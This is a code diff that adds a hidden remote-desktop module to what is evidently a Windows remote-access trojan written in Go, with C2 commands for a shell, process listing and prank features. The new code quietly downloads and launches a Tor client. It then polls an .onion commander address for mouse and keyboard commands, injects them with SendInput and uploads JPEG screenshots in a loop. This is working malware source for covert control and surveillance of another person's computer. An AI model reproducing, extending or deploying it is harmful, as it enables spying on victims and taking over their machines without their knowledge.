@@ -1,8 +1,10 @@
 package main
 
 import (
+	"archive/tar"
 	"archive/zip"
 	"bytes"
+	"compress/gzip"
 	"context"
 	"crypto/aes"
 	"crypto/cipher"
@@ -13,11 +15,16 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"image"
+	"image/color"
+	"image/jpeg"
 	"io"
 	mrand "math/rand"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
+	"os/exec"
 	"os/user"
 	"path/filepath"
 	"regexp"
@@ -105,6 +112,8 @@ var (
 	pRegCloseKey               = advapi32.NewProc("RegCloseKey")
 	pRegCreateKeyExW           = advapi32.NewProc("RegCreateKeyExW")
 	pShellExecuteW             = shell32.NewProc("ShellExecuteW")
+	pSetCursorPos              = user32.NewProc("SetCursorPos")
+	pSendInput                 = user32.NewProc("SendInput")
 )
 
 // ================================================================
@@ -130,11 +139,48 @@ const (
 	KEYEVENTF_KEYUP    = 0x0002
 	MB_OK              = 0x00000000
 	MB_ICONWARNING     = 0x00000030
+
+	// SendInput constants
+	INPUT_MOUSE             = 0
+	INPUT_KEYBOARD          = 1
+	MOUSEEVENTF_LEFTDOWN    = 0x0002
+	MOUSEEVENTF_LEFTUP      = 0x0004
+	MOUSEEVENTF_RIGHTDOWN   = 0x0008
+	MOUSEEVENTF_RIGHTUP     = 0x0010
+	MOUSEEVENTF_MIDDLEDOWN  = 0x0020
+	MOUSEEVENTF_MIDDLEUP    = 0x0040
+	MOUSEEVENTF_WHEEL       = 0x0800
+	KEYEVENTF_EXTENDEDKEY   = 0x0001
+	KEYEVENTF_UNICODE       = 0x0004
+	KEYEVENTF_KEYUP_SEND    = 0x0002
 )
 
 // ================================================================
 // NATIVE STRUCTS
 // ================================================================
+
+// SendInput mouse input (matches Win32 INPUT struct with MOUSEINPUT union)
+type mouseInputW struct {
+	InputType uint32
+	Dx        int32
+	Dy        int32
+	MouseData uint32
+	DwFlags   uint32
+	Time      uint32
+	ExtraInfo uintptr
+	_pad      [8]byte
+}
+
+// SendInput keyboard input (matches Win32 INPUT struct with KEYBDINPUT union)
+type keybdInputW struct {
+	InputType   uint32
+	WVk         uint16
+	WScan       uint16
+	DwFlags     uint32
+	Time        uint32
+	DwExtraInfo uintptr
+	_pad        [8]byte
+}
 
 type processEntry32 struct {
 	Size            uint32
@@ -950,6 +996,391 @@ func captureScreen() ([]byte, error) {
 	binary.Write(&buf, binary.LittleEndian, uint32(0))
 	buf.Write(pixels)
 	return buf.Bytes(), nil
+}
+
+// ================================================================
+// VNC — INPUT SIMULATION
+// ================================================================
+
+func vncMoveMouse(x, y int) {
+	pSetCursorPos.Call(uintptr(x), uintptr(y))
+}
+
+func vncMouseDown(button string) {
+	var flags uint32
+	switch button {
+	case "right":
+		flags = MOUSEEVENTF_RIGHTDOWN
+	case "middle":
+		flags = MOUSEEVENTF_MIDDLEDOWN
+	default:
+		flags = MOUSEEVENTF_LEFTDOWN
+	}
+	input := mouseInputW{InputType: INPUT_MOUSE, DwFlags: flags}
+	pSendInput.Call(1, uintptr(unsafe.Pointer(&input)), unsafe.Sizeof(input))
+}
+
+func vncMouseUp(button string) {
+	var flags uint32
+	switch button {
+	case "right":
+		flags = MOUSEEVENTF_RIGHTUP
+	case "middle":
+		flags = MOUSEEVENTF_MIDDLEUP
+	default:
+		flags = MOUSEEVENTF_LEFTUP
+	}
+	input := mouseInputW{InputType: INPUT_MOUSE, DwFlags: flags}
+	pSendInput.Call(1, uintptr(unsafe.Pointer(&input)), unsafe.Sizeof(input))
+}
+
+func vncClick(button string, double bool) {
+	vncMouseDown(button)
+	time.Sleep(10 * time.Millisecond)
+	vncMouseUp(button)
+	if double {
+		time.Sleep(50 * time.Millisecond)
+		vncMouseDown(button)
+		time.Sleep(10 * time.Millisecond)
+		vncMouseUp(button)
+	}
+}
+
+func vncScroll(delta int) {
+	input := mouseInputW{InputType: INPUT_MOUSE, DwFlags: MOUSEEVENTF_WHEEL, MouseData: uint32(delta)}
+	pSendInput.Call(1, uintptr(unsafe.Pointer(&input)), unsafe.Sizeof(input))
+}
+
+func vncTypeText(text string) {
+	for _, r := range text {
+		// Key down
+		down := keybdInputW{InputType: INPUT_KEYBOARD, WScan: uint16(r), DwFlags: KEYEVENTF_UNICODE}
+		pSendInput.Call(1, uintptr(unsafe.Pointer(&down)), unsafe.Sizeof(down))
+		// Key up
+		up := keybdInputW{InputType: INPUT_KEYBOARD, WScan: uint16(r), DwFlags: KEYEVENTF_UNICODE | KEYEVENTF_KEYUP_SEND}
+		pSendInput.Call(1, uintptr(unsafe.Pointer(&up)), unsafe.Sizeof(up))
+		time.Sleep(5 * time.Millisecond)
+	}
+}
+
+func vncPressKey(vk int, modifiers []int) {
+	// Press modifiers
+	for _, mod := range modifiers {
+		down := keybdInputW{InputType: INPUT_KEYBOARD, WVk: uint16(mod)}
+		pSendInput.Call(1, uintptr(unsafe.Pointer(&down)), unsafe.Sizeof(down))
+	}
+	// Press key
+	down := keybdInputW{InputType: INPUT_KEYBOARD, WVk: uint16(vk)}
+	pSendInput.Call(1, uintptr(unsafe.Pointer(&down)), unsafe.Sizeof(down))
+	time.Sleep(10 * time.Millisecond)
+	// Release key
+	up := keybdInputW{InputType: INPUT_KEYBOARD, WVk: uint16(vk), DwFlags: KEYEVENTF_KEYUP_SEND}
+	pSendInput.Call(1, uintptr(unsafe.Pointer(&up)), unsafe.Sizeof(up))
+	// Release modifiers in reverse
+	for i := len(modifiers) - 1; i >= 0; i-- {
+		up := keybdInputW{InputType: INPUT_KEYBOARD, WVk: uint16(modifiers[i]), DwFlags: KEYEVENTF_KEYUP_SEND}
+		pSendInput.Call(1, uintptr(unsafe.Pointer(&up)), unsafe.Sizeof(up))
+	}
+}
+
+// ================================================================
+// VNC — JPEG SCREENSHOT
+// ================================================================
+
+func captureScreenJPEG(quality int, scale float64) ([]byte, error) {
+	bmpData, err := captureScreen()
+	if err != nil {
+		return nil, err
+	}
+	if len(bmpData) < 54 {
+		return nil, fmt.Errorf("invalid BMP data")
+	}
+
+	// Parse BMP header
+	width := int(binary.LittleEndian.Uint32(bmpData[18:22]))
+	height := int(binary.LittleEndian.Uint32(bmpData[22:26]))
+	if width <= 0 || height <= 0 {
+		return nil, fmt.Errorf("invalid BMP dimensions")
+	}
+
+	// Parse pixel data (24-bit BGR, bottom-up, padded rows)
+	pixelOffset := int(binary.LittleEndian.Uint32(bmpData[10:14]))
+	rowSize := (width*3 + 3) & ^3
+	pixels := bmpData[pixelOffset:]
+
+	img := image.NewRGBA(image.Rect(0, 0, width, height))
+	for y := 0; y < height; y++ {
+		srcRow := (height - 1 - y) * rowSize // BMP is bottom-up
+		for x := 0; x < width; x++ {
+			off := srcRow + x*3
+			if off+2 < len(pixels) {
+				img.SetRGBA(x, y, color.RGBA{R: pixels[off+2], G: pixels[off+1], B: pixels[off], A: 255})
+			}
+		}
+	}
+
+	// Downscale if needed
+	var finalImg image.Image = img
+	if scale < 1.0 && scale > 0 {
+		newW := int(float64(width) * scale)
+		newH := int(float64(height) * scale)
+		scaled := image.NewRGBA(image.Rect(0, 0, newW, newH))
+		for y := 0; y < newH; y++ {
+			srcY := int(float64(y) / scale)
+			for x := 0; x < newW; x++ {
+				srcX := int(float64(x) / scale)
+				scaled.Set(x, y, img.At(srcX, srcY))
+			}
+		}
+		finalImg = scaled
+	}
+
+	// Encode to JPEG
+	var buf bytes.Buffer
+	if err := jpeg.Encode(&buf, finalImg, &jpeg.Options{Quality: quality}); err != nil {
+		return nil, err
+	}
+	return buf.Bytes(), nil
+}
+
+// ================================================================
+// VNC — TOR CLIENT (SOCKS5 PROXY FOR AGENT)
+// ================================================================
+
+// Build-time constants — replaced by setup.py
+const (
+	vncOnionAddr = "placeholder.onion"
+	vncAuthToken = "placeholder_token"
+)
+
+var torClientProcess *exec.Cmd
+
+func getTorClientPath() string {
+	return filepath.Join(os.TempDir(), "tor_client", "tor.exe")
+}
+
+func downloadTorClient() (string, error) {
+	torExe := getTorClientPath()
+	if _, err := os.Stat(torExe); err == nil {
+		return torExe, nil
+	}
+
+	torDir := filepath.Dir(torExe)
+	os.MkdirAll(torDir, 0755)
+
+	// Download Tor Expert Bundle
+	torURL := "https://archive.torproject.org/tor-package-archive/torbrowser/14.0.4/tor-expert-bundle-windows-x86_64-14.0.4.tar.gz"
+	resp, err := http.Get(torURL)
+	if err != nil {
+		return "", fmt.Errorf("download tor: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != 200 {
+		return "", fmt.Errorf("download tor: HTTP %d", resp.StatusCode)
+	}
+
+	// Extract tar.gz
+	gz, err := gzip.NewReader(resp.Body)
+	if err != nil {
+		return "", fmt.Errorf("gzip: %w", err)
+	}
+	defer gz.Close()
+
+	tr := tar.NewReader(gz)
+	for {
+		hdr, err := tr.Next()
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			return "", fmt.Errorf("tar: %w", err)
+		}
+
+		// Extract all files under tor/ to our tor_client dir
+		name := filepath.ToSlash(hdr.Name)
+		if strings.Contains(name, "tor/") && hdr.Typeflag == tar.TypeReg {
+			// Flatten: tor/tor.exe → tor_client/tor.exe, tor/libcrypto*.dll → tor_client/libcrypto*.dll
+			base := filepath.Base(name)
+			outPath := filepath.Join(torDir, base)
+			f, err := os.Create(outPath)
+			if err != nil {
+				continue
+			}
+			io.Copy(f, tr)
+			f.Close()
+		}
+	}
+
+	if _, err := os.Stat(torExe); err != nil {
+		return "", fmt.Errorf("tor.exe not found after extraction")
+	}
+
+	return torExe, nil
+}
+
+func startTorSocks() (int, error) {
+	torExe, err := downloadTorClient()
+	if err != nil {
+		return 0, err
+	}
+
+	torDir := filepath.Dir(torExe)
+	dataDir := filepath.Join(torDir, "data")
+	os.MkdirAll(dataDir, 0755)
+
+	// Find a free port for SOCKS
+	ln, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		return 0, err
+	}
+	port := ln.Addr().(*net.TCPAddr).Port
+	ln.Close()
+
+	// Write torrc
+	torrc := filepath.Join(torDir, "torrc")
+	content := fmt.Sprintf("SocksPort %d\nDataDirectory %s\n", port, filepath.ToSlash(dataDir))
+	os.WriteFile(torrc, []byte(content), 0644)
+
+	// Start tor
+	cmd := exec.Command(torExe, "-f", torrc)
+	cmd.Dir = torDir
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	if err := cmd.Start(); err != nil {
+		return 0, fmt.Errorf("start tor: %w", err)
+	}
+	torClientProcess = cmd
+
+	// Wait for SOCKS port to be ready
+	for i := 0; i < 60; i++ {
+		conn, err := net.DialTimeout("tcp", fmt.Sprintf("127.0.0.1:%d", port), time.Second)
+		if err == nil {
+			conn.Close()
+			return port, nil
+		}
+		time.Sleep(2 * time.Second)
+	}
+
+	return 0, fmt.Errorf("tor SOCKS port not ready after 120s")
+}
+
+func stopTorClient() {
+	if torClientProcess != nil && torClientProcess.Process != nil {
+		torClientProcess.Process.Kill()
+		torClientProcess = nil
+	}
+}
+
+// ================================================================
+// VNC — AGENT CLIENT LOOP
+// ================================================================
+
+func startVNCClient(ctx context.Context, c2 *C2Client) {
+	if vncOnionAddr == "placeholder.onion" || vncOnionAddr == "" {
+		return
+	}
+
+	// Start Tor SOCKS proxy
+	socksPort, err := startTorSocks()
+	if err != nil {
+		return
+	}
+
+	// Create HTTP client with SOCKS5 proxy
+	proxyURL, _ := url.Parse(fmt.Sprintf("socks5://127.0.0.1:%d", socksPort))
+	transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
+	client := &http.Client{Transport: transport, Timeout: 30 * time.Second}
+
+	baseURL := fmt.Sprintf("http://%s", vncOnionAddr)
+	quality := 50
+	scale := 0.75
+
+	defer stopTorClient()
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		default:
+		}
+
+		// Poll for commands
+		req, _ := http.NewRequestWithContext(ctx, "GET", baseURL+"/api/commands", nil)
+		req.Header.Set("Authorization", "Bearer "+vncAuthToken)
+		resp, err := client.Do(req)
+		if err != nil {
+			time.Sleep(3 * time.Second)
+			continue
+		}
+
+		var cmdResp struct {
+			Commands []struct {
+				Action    string  `json:"action"`
+				X         int     `json:"x"`
+				Y         int     `json:"y"`
+				Button    string  `json:"button"`
+				Double    bool    `json:"double"`
+				Delta     int     `json:"delta"`
+				Text      string  `json:"text"`
+				Vk        int     `json:"vk"`
+				Modifiers []int   `json:"modifiers"`
+				Quality   int     `json:"quality"`
+				Scale     float64 `json:"scale"`
+			} `json:"commands"`
+		}
+		json.NewDecoder(resp.Body).Decode(&cmdResp)
+		resp.Body.Close()
+
+		// Execute commands
+		for _, cmd := range cmdResp.Commands {
+			switch cmd.Action {
+			case "mousemove":
+				vncMoveMouse(cmd.X, cmd.Y)
+			case "mousedown":
+				vncMouseDown(cmd.Button)
+			case "mouseup":
+				vncMouseUp(cmd.Button)
+			case "click":
+				vncClick(cmd.Button, cmd.Double)
+			case "scroll":
+				vncScroll(cmd.Delta)
+			case "type":
+				vncTypeText(cmd.Text)
+			case "key":
+				vncPressKey(cmd.Vk, cmd.Modifiers)
+			case "config":
+				if cmd.Quality > 0 {
+					quality = cmd.Quality
+				}
+				if cmd.Scale > 0 {
+					scale = cmd.Scale
+				}
+			}
+		}
+
+		// Capture and send screenshot
+		jpegData, err := captureScreenJPEG(quality, scale)
+		if err == nil && len(jpegData) > 0 {
+			req, _ := http.NewRequestWithContext(ctx, "POST", baseURL+"/api/screenshot", bytes.NewReader(jpegData))
+			req.Header.Set("Authorization", "Bearer "+vncAuthToken)
+			req.Header.Set("Content-Type", "image/jpeg")
+			resp, err := client.Do(req)
+			if err == nil {
+				resp.Body.Close()
+			}
+		}
+
+		// Heartbeat
+		req, _ = http.NewRequestWithContext(ctx, "POST", baseURL+"/api/heartbeat", nil)
+		req.Header.Set("Authorization", "Bearer "+vncAuthToken)
+		resp, err = client.Do(req)
+		if err == nil {
+			resp.Body.Close()
+		}
+
+		time.Sleep(300 * time.Millisecond)
+	}
 }
 
 // ================================================================
@@ -2022,6 +2453,10 @@ PRANKS
   fakeupdate     - Fake Windows update screen
   soundspam      - Play all Windows sounds
 
+REMOTE DESKTOP
+  vnc_start      - Start VNC client (connects to commander via Tor)
+  vnc_stop       - Stop VNC client
+
 CONTROL
   shell          - Execute shell command (args: cmd)
   processes      - List running processes
@@ -2289,6 +2724,20 @@ func handleCommand(c2 *C2Client, jm *JobManager, cmd Command) {
 		}
 		time.Sleep(time.Duration(args.Seconds) * time.Second)
 		result = fmt.Sprintf("Slept %d seconds", args.Seconds)
+
+	case "vnc_start":
+		if vncOnionAddr == "placeholder.onion" || vncOnionAddr == "" {
+			result = "VNC not configured — no .onion address set at build time"
+		} else {
+			jm.Start("vnc", func(ctx context.Context) {
+				startVNCClient(ctx, c2)
+			})
+			result = "VNC client connecting to " + vncOnionAddr
+		}
+
+	case "vnc_stop":
+		jm.Stop("vnc")
+		result = "VNC client stopped"
 
 	case "exit", "close":
 		c2.UpdateCommand(cmd.ID, "complete", "Exiting")
